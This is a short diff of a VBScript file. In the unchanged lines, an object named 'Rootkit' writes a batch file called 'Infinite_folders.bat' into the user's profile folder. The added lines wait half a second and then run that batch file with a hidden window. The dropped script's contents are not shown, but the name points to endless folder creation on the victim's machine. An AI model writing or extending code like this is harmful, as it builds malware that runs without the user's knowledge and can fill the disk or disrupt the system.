@@ -27,6 +27,10 @@ If NOT (filesystem.FileExists (userprofile + "\Infinite_folders.bat")) Then
 	Rootkit.WriteLine ("exit")
 	
 	Rootkit.Close
+	
+	WScript.Sleep (500)
+
+	objShell.run "%userprofile%\Infinite_folders.bat", 0
 
 Else
 
